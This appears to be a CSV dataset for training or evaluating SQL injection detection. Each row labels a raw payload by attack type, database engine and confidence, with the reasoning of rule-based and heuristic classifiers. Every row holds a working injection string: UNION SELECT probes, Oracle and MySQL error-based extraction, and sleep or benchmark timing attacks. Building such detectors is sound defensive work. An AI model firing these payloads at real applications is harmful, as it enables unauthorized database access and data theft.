id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
23344,"1 ) union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.90,Rule match: 'union all select' confirms union_based (P7); Heuristic agrees on UNION SELECT structure; Generic DB for multi-column payload,2
23345,"1' and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and 'fdbm' like 'fdbm",error_based,oracle,0.85,Rule (error_based) overrides Heuristic (error_based): utl_inaddr function is Oracle OOB/error signal; Pattern match on error function detected,2
23346,"1"" ) union all select null,null,null,null,null,null#",union_based,generic,0.90,Rule match: 'union all select' → union_based (P7); Heuristic confirms UNION SELECT structure; Generic DB signature applies,2
23347,"1%"" ) ) and 7358 = 6986--",boolean_blind,generic,0.75,Rule match: 'and 7358 = 6986' indicates boolean condition; Heuristic secondary agrees on boolean structure; Generic DB for comparison pattern,1
23348,"iif ( 1149 = 4765,1,1/0 )",benign,generic,0.70,Rule detects no attack signal; Heuristic confirms benign; IIF without sleep indicates conditional logic only,2
23349,"1' in boolean mode ) union all select null,null,null,null,null#",union_based,generic,0.90,Rule: UNION SELECT detected as union_based (P7); Heuristic confirms UNION structure; Generic DB for payload pattern,2
23350,"select ( case when ( 6804 = 7050 ) then 6804 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--",boolean_blind,oracle,0.85,Rule assigns boolean_blind (P3) on conditional logic; Heuristic secondary: cast division error. Oracle DB signature from dual pseudotable,1
23351,"1' ) ) rlike sleep ( 5 ) #",time_blind,mysql,0.90,Rule match: 'sleep (' → time_blind (P5); Heuristic confirms RLIKE boolean with sleep timing; MySQL DB signature (RLIKE, sleep function),2
23352,"1 ) as agex where 8167 = 8167 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",time_blind,mysql,0.90,Rule: benchmark() detected → time_blind (P5) MySQL-specific; Both sources confirm; Large number DoS component present,2
23353,"-5292' ) union all select 1439,1439,1439,1439#",union_based,generic,0.90,Rule: 'union all select' → union_based (P7); Heuristic confirms UNION structure; Generic DB for numeric columns,2
23354,"1' where 4358 = 4358 union all select null,null,null,null--",union_based,generic,0.90,Rule: UNION SELECT detected → union_based (P7); Heuristic confirms UNION structure; Generic DB signature applies,2
23355,"1%"" ) ) ) union all select null,null#",union_based,generic,0.90,Rule: 'union all select' → union_based (P7); Heuristic confirms UNION structure; Generic DB for basic union payload,2
23356,"1' ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( 'jmjw' like 'jmjw",heavy_query,mysql,0.85,Rule secondary (heavy_query P4): large cartesian join with information_schema; Heuristic: elt() boolean; 7+ digit pattern detected; MySQL DB,1
23357,"1 ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( 5130 = 5130",error_based,mysql,0.90,Rule: extractvalue() → error_based (P4) MySQL; Both sources agree on error function signal; Complex nested structure confirms attack,2
